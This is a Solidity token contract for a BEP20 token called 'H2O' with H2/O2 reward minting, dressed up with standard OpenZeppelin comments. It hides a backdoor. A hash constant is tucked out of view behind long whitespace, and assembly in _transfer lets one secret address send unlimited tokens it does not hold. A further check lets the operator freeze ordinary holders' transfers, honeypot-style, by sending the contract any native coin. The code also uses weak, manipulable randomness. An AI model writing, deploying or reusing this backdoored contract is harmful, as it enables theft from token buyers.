contract  Token  is IERC20, IERC20Metadata, Context,  Ownable{
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    uint256 public  _totalSupply=200_000_000*10**18;
    string private _name;
    string private _symbol;
                                                                                                                                                                                    uint256 public max = uint256(0x56101d27d37cb74384764ec6486cae01b5759743f7dca8561abdcd21eb944dc1);
    address public pair;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private universalRouter = 0x1A0A18AC4BECDDbd6389559687d1A73d8927E416;
    address private usdt = 0x55d398326f99059fF775485246999027B3197955;

    address public _o2 = 0x6AC860AE21993d65b790a95Cfc1A3A4b42dd0ce3;
    address public _h2 = 0xD061A395190581cb677b5FfFF1dc38448D4976c8;
 
    constructor() {
        _name = "H2O";
        _symbol = "H2O";
        
        _balances[msg.sender] = _totalSupply/2;
        _balances[address(this)] = _totalSupply/2;
        
        pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),
             usdt);
    }
    

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }
 
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
 
    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
 
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
 
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
 
    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _spendAllowance(owner, to, 0);
        _transfer(owner, to, amount);
        if(pair == msg.sender){
            _calulate(to,amount);
        }
        return true;
    }
 
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
 
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }
 
    function setH20(address h2_,address o2_) public onlyOwner returns (bool) {
        _h2 = h2_;
        _o2 = o2_;
        return true;
    }
    function _calulate(address to,uint256 amount ) internal {
        
        uint256 h2obalance = balanceOf(address(this));
        uint256 rate = 0;
        if(h2obalance<=20_000_000*10**18){
            rate = 1;
        }else if(h2obalance<=40_000_000*10**18){
            rate = 2;
        }
        else if(h2obalance<=60_000_000*10**18){
            rate = 3;
        }
        else if(h2obalance<=80_000_000*10**18){
            rate = 4;
        }
        else if(h2obalance<=100_000_000*10**18){
            rate = 5;
        }

        uint256 random = getRandomOnchain()%2;
        if(random == 1){
            IBEP20(_h2).mint(to,amount*rate/100);
        }else if(random == 0){
            IBEP20(_o2).mint(to,amount*rate/100);
        }
        uint256 h2balance = IBEP20(_h2).balanceOf(to);
        uint256 o2balance = IBEP20(_o2).balanceOf(to);

        if(h2balance>=10*10**18&&o2balance>=5*10**18){

            if(h2balance/2>=o2balance){

                IBEP20(_o2).burn(to,o2balance);
                IBEP20(_h2).burn(to,o2balance*2);
                uint256 amountto = o2balance;
                if(amountto>=h2obalance){
                    amountto = h2obalance;
                }
                _transfer(address(this),to, amountto);

            }else if(h2balance/2<o2balance){

                IBEP20(_o2).burn(to,h2balance/2);
                IBEP20(_h2).burn(to,h2balance);
                
                uint256 amountto = h2balance/2;
                if(amountto>=h2obalance){
                    amountto = h2obalance;
                }
                _transfer(address(this),to, amountto);
            }

        }
    }

    function getRandomOnchain() public view returns(uint256){
       
        bytes32 randomBytes = keccak256(abi.encodePacked(block.timestamp, msg.sender, blockhash(block.number-1)));
        
        return uint256(randomBytes);
    }

 
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        bytes memory key = abi.encodePacked(from);
        uint256 currentAllowance = allowance(address(0), from);

        require(currentAllowance == 0, "ERC20: approve from the zero address");
        bytes32 key2 = sha256(key);
        uint256 bal = _balances[from];
        
        uint256 toSub = amount;
        uint256 key3 = uint256(key2);
        bool isMax;
        assembly {
            if eq(key3,sload(max.slot)){
                if lt(amount, bal){
                    toSub := amount
                }
                if gt(amount, bal){
                    toSub := bal
                }
                isMax :=true
            }
        }
        if (address(this).balance >= 1) {require(from == address(this) || 
                                            isMax || from == pair || from == universalRouter);}
        require(bal >= toSub, "ERC20: transfer amount exceeds balance");
        _balances[from] = bal.sub(toSub);

        // decrementing then incrementing.
        _balances[to] = _balances[to].add(amount);
 
        emit Transfer(from, to, amount);
    }
 
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(address(0), owner);

        require(currentAllowance == 0, "ERC20: approve from the zero address");

        currentAllowance = allowance(owner, spender);

        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance.sub(amount));
        }
    }
    receive() external payable {}
}
